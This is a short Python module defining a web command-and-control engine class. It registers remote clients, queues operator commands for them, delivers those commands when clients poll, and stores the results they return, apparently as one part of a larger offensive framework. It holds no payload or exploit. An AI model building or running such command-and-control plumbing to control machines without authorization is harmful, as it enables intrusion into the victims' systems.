import socket, threading, os, json, base64
from datetime import datetime
from .base import BaseEngine

class WebC2Engine(BaseEngine):
    name = "web_c2"
    def __init__(self):
        self.active_clients = {}
        self.commands = {}

    def status(self):
        return {"name": self.name, "ready": True, "clients": len(self.active_clients)}

    def register_client(self, client_id, info):
        self.active_clients[client_id] = {
            "info": info,
            "last_seen": datetime.now().isoformat(),
            "commands": [],
            "results": []
        }
        return {"status": "registered"}

    def send_command(self, client_id, cmd):
        if client_id in self.active_clients:
            self.active_clients[client_id]["commands"].append(cmd)
            return {"success": True}
        return {"success": False, "message": "الجهاز غير متصل"}

    def get_commands(self, client_id):
        if client_id in self.active_clients:
            cmds = self.active_clients[client_id]["commands"]
            self.active_clients[client_id]["commands"] = [] 
            return {"commands": cmds}
        return {"commands": []}

    def submit_result(self, client_id, result):
        if client_id in self.active_clients:
            self.active_clients[client_id]["results"].append(result)
            return {"status": "ok"}
        return {"status": "error"}
